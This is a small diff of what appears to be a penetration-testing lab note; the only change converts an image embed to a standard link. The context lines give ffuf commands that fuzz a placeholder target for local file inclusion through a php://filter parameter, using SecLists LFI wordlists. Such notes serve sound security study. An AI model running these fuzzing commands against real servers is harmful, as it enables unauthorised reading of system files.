@@ -1,5 +1,5 @@
 you can use request from burp and save it to file req.txt for fuzzing:
-![[Pasted image 20251230143604.png]]
+![](attachments/img-20251230143604.png)
 ```bash
 ffuf -request req.txt -request-proto http -w /media/sf_wordlists/SecLists-master/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0  
 ffuf -u "http://TARGET_IP/secret-script.php?file=php://filter/resource=FUZZ" -w /media/sf_wordlists/SecLists-master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc 200 -fs 0
